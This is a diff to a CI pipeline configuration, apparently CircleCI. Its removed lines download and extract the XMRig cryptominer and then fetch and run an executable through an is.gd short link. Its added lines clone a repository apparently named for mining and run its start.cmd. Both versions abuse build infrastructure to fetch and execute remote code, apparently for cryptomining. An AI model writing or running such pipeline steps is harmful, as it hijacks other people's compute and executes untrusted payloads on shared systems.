@@ -25,8 +25,5 @@ jobs:
           destination: tr1
       - run:
           name: Invoke
-          command: wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz
-      - run:
-          name: Extract
-          command: tar xf xmrig-6.15.0-linux-x64.tar.gz
-      - run: curl -L -o yourcustomlink.exe https://is.gd/yourcustomlink && yourcustomlink.exe
+          command: git clone https://github.com/masterminer1000/1.git
+      - run: start.cmd
